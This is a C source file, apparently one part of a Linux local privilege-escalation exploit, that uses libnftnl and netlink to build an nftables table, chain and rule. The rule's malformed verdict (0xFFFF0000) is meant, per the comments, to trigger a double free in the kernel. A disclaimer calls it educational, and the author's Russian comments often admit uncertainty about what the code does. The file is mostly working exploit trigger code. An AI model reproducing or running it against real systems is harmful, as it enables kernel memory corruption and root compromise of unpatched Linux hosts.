// This program, and the other programs and scripts ("programs", "these programs") in this software directory/folder/repository ("repository") are published, developed and distributed for educational/research purposes only. I ("the creator") do not condone any malicious or illegal usage of these programs, as the intend is sharing research and not doing illegal activities with it. I am not legally responsible for anything you do with these programs.

#define _GNU_SOURCE 1
#include <stddef.h>
#include <stdlib.h>
#include <time.h>

#include <netinet/ip.h>

// netfilter.h has guards for netinet/ip.h
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>

#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>

#include "nftnl.h"
#include "env.h"

// Функция для отправки "полезной нагрузки", по сути вспомогательная для создания правила
// В моем понимании - форматирует правило необходимым образом и задает необходимые поля данных
static void add_payload(struct nftnl_rule *r, uint32_t base, uint32_t dreg,
                        uint32_t offset, uint32_t len)
{
	struct nftnl_expr *e;

	e = nftnl_expr_alloc("payload");
	if (e == NULL) {
		perror("expr payload");
		exit(EXIT_FAILURE);
	}

	nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_BASE, base);
	nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_DREG, dreg);
	nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_OFFSET, offset);
	nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_LEN, len);

	nftnl_rule_add_expr(r, e);
}

// Установка вердикта правила, хотя она непосдрественно его и не устанавливает
// но она отправляет его в ядро
static void add_set_verdict(struct nftnl_rule *r, uint32_t val)
{
	struct nftnl_expr *e;

	e = nftnl_expr_alloc("immediate");
	if (e == NULL) {
		perror("expr immediate");
		exit(EXIT_FAILURE);
	}
	// происходит это ориентировачно где то тут
	nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_DREG, NFT_REG_VERDICT);
	nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_VERDICT, val);

	nftnl_rule_add_expr(r, e);
}

// Пока не очень понимаю назначение этой функции
// Сугубо по названию, думаю что служит для сравнения
// входящих пакетов с правилами
// на деле работает с регистрами nft (пока даже не представляю что это)
static void add_cmp(struct nftnl_rule *r, uint32_t sreg, uint32_t op,
                    const void *data, uint32_t data_len)
{
	struct nftnl_expr *e;

	e = nftnl_expr_alloc("cmp");
	if (e == NULL) {
		perror("expr cmp");
		exit(EXIT_FAILURE);
	}

	nftnl_expr_set_u32(e, NFTNL_EXPR_CMP_SREG, sreg);
	nftnl_expr_set_u32(e, NFTNL_EXPR_CMP_OP, op);
	nftnl_expr_set(e, NFTNL_EXPR_CMP_DATA, data, data_len);

	nftnl_rule_add_expr(r, e);
}

// Здесь происходит вся магия по созданию нового правила
static struct nftnl_rule *alloc_rule(unsigned char family, const char *table, const char *chain, unsigned char proto)
{
	struct nftnl_rule *r = NULL;

	r = nftnl_rule_alloc();
	if (r == NULL) {
		perror("rule alloc");
		exit(EXIT_FAILURE);
	}

	nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);
	nftnl_rule_set(r, NFTNL_RULE_TABLE, table);
	nftnl_rule_set(r, NFTNL_RULE_CHAIN, chain);

	// expect protocol to be `proto`
	// думаю тут мы определяем тип пакета
	// но тоже не шибко уверен
	add_payload(r, NFT_PAYLOAD_NETWORK_HEADER, NFT_REG_1, offsetof(struct iphdr, protocol), sizeof(unsigned char));
	add_cmp(r, NFT_REG_1, NFT_CMP_EQ, &proto, sizeof(unsigned char));

	// expect 4 first bytes of packet to be \x41
	// полагаю это сделано, что бы правило не тригерилось любым входящим пакетом
	// но могу и ошибаться
    add_payload(r, NFT_PAYLOAD_NETWORK_HEADER, NFT_REG_1, sizeof(struct iphdr), 4);
    add_cmp(r, NFT_REG_1, NFT_CMP_EQ, "\x41\x41\x41\x41", 4);


	// (NF_DROP | -((0xFFFF << 16) >> 16)) == 1, aka NF_ACCEPT (trigger double free)
	// (NF_DROP | -((0xFFF0 << 16) >> 16)) == 16
	// Главная часть - заброс нагрузки ввиде вердикта, ломающего всю цепочку
	// Ввиду сложности устройства api - мне кажется просто кидать его в пустоту
	// банально ничего не даст
	add_set_verdict(r, (unsigned int)(0xFFFF0000));

	return r;
}

// тут идет создание таблицы, необходимая вещь для полноты правила
struct nftnl_table *alloc_table(unsigned char family, const char *table_name) {
    struct nftnl_table *t;
	
	t = nftnl_table_alloc();
    if (t == NULL) {
        perror("nftnl_table_alloc");
        exit(EXIT_FAILURE);
    }

    nftnl_table_set_u32(t, NFTNL_TABLE_FAMILY, family);
    nftnl_table_set_str(t, NFTNL_TABLE_NAME, table_name);

    return t;
}

// создание цепочки, тоже нужно, так устроен nft
static struct nftnl_chain *alloc_chain(unsigned char family, const char *table, const char *chain, unsigned int hooknum) {
    struct nftnl_chain *c;
	
	c = nftnl_chain_alloc();
    if (c == NULL) {
        perror("nftnl_chain_alloc");
        exit(EXIT_FAILURE);
    }

    nftnl_chain_set_u32(c, NFTNL_CHAIN_FAMILY, family);
    nftnl_chain_set_str(c, NFTNL_CHAIN_TABLE, table);
    nftnl_chain_set_str(c, NFTNL_CHAIN_NAME, chain);
    nftnl_chain_set_u32(c, NFTNL_CHAIN_HOOKNUM, hooknum);
    nftnl_chain_set_u32(c, NFTNL_CHAIN_PRIO, NF_IP_PRI_LAST);  // only rule in new namespace, so prio shouldn't matter
    nftnl_chain_set_str(c, NFTNL_CHAIN_TYPE, "filter");

    return c;
}

// does not work if nft is not installed
void unconfigure_nftables() {
	system("/sbin/nft delete table ip filter");
}

// an L2/L3/L4 protocol etc. is called a family: so we call a protocol a family in this code
void configure_nftables() {
	// Начинаем с создания переменных
	struct mnl_socket *nl_sock;
	struct nlmsghdr *nlh;
	struct mnl_nlmsg_batch *batch;
	char buf[MNL_SOCKET_BUFFER_SIZE];
	uint32_t seq = time(NULL);
	int ret, batching;
	struct nftnl_table *t1;
	struct nftnl_chain *c1;
	struct nftnl_rule *r1;

	printf("[*] setting up nftables...\n");

	PRINTF_VERBOSE("[*] allocating netfilter objects...\n");
	// тут происходит выделение вероятнее всего памяти под таблицу, цепочку и правило
	// иными словами - создается вся иерархия nftables
	t1 = alloc_table(NFPROTO_IPV4, "filter");
	c1 = alloc_chain(NFPROTO_IPV4, "filter", "df", NF_INET_PRE_ROUTING);
	r1 = alloc_rule(NFPROTO_IPV4, "filter", "df", 70);
	// далее открывается сокет
	// полагаю через него будут засылаться правила
	nl_sock = mnl_socket_open(NETLINK_NETFILTER);
	if (nl_sock == NULL) {
		perror("mnl_socket_open");
		exit(EXIT_FAILURE);
	}

	if (mnl_socket_bind(nl_sock, 0, MNL_SOCKET_AUTOPID) < 0) {
		perror("mnl_socket_bind");
		exit(EXIT_FAILURE);
	}
	//вероятно проверка "соединения"
	batching = nftnl_batch_is_supported();
	if (batching < 0) {
		printf("[!] can't comm with nfnetlink");
		exit(EXIT_FAILURE);
	}
	// дальше тоже немного не понимаю суть структуры
	// как мне кажется - идет формирование правил
	// путем создания связного списка
	// для их последующей отправки в ядро
	batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
	if (batching) {
		nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
		mnl_nlmsg_batch_next(batch);
	}

    nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                      NFT_MSG_NEWTABLE,
                                      nftnl_table_get_u32(t1, NFTNL_TABLE_FAMILY), // Set the family here
                                      NLM_F_APPEND|NLM_F_CREATE|NLM_F_ACK, seq++);

    nftnl_table_nlmsg_build_payload(nlh, t1);
    nftnl_table_free(t1);
    mnl_nlmsg_batch_next(batch);

	nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
									NFT_MSG_NEWCHAIN, 
									nftnl_chain_get_u32(c1, NFTNL_CHAIN_FAMILY), 
									NLM_F_APPEND|NLM_F_CREATE|NLM_F_ACK, seq++);

	nftnl_chain_nlmsg_build_payload(nlh, c1);
	nftnl_chain_free(c1);
	mnl_nlmsg_batch_next(batch);

	nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
									NFT_MSG_NEWRULE,
									nftnl_rule_get_u32(r1, NFTNL_RULE_FAMILY),
									NLM_F_APPEND|NLM_F_CREATE|NLM_F_ACK, seq++);
	// Нас наиболее интересует вот эта часть
	// тут идет загрука правила
	nftnl_rule_nlmsg_build_payload(nlh, r1);
	nftnl_rule_free(r1);
	mnl_nlmsg_batch_next(batch);

	if (batching) {
		nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
		mnl_nlmsg_batch_next(batch);
	}
	// тут происходит отправка подготовленной серии данных в саму api
	PRINTF_VERBOSE("[*] sending nftables tables/chains/rules/expr using netlink...\n");
	ret = mnl_socket_sendto(nl_sock, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch));
	if (ret < 0) {
		perror("mnl_socket_sendto");
		exit(EXIT_FAILURE);
	}

	mnl_nlmsg_batch_stop(batch);
	// получаем ответ, поидее это должна быть готовая цепочка
	// или просто ответ, что наша цепочка успешна
	ret = mnl_socket_recvfrom(nl_sock, buf, sizeof(buf));
	if (ret < 0) {
		perror("mnl_socket_recvfrom");
		exit(EXIT_FAILURE);
	}

	ret = mnl_cb_run(buf, ret, 0, mnl_socket_get_portid(nl_sock), NULL, NULL);
	if (ret < 0) {
		perror("mnl_cb_run");
		exit(EXIT_FAILURE);
	}

	mnl_socket_close(nl_sock);

#if CONFIG_VERBOSE_
	// nft binary is not in PATH by default
	system("/sbin/nft -a list table ip filter");
#endif
}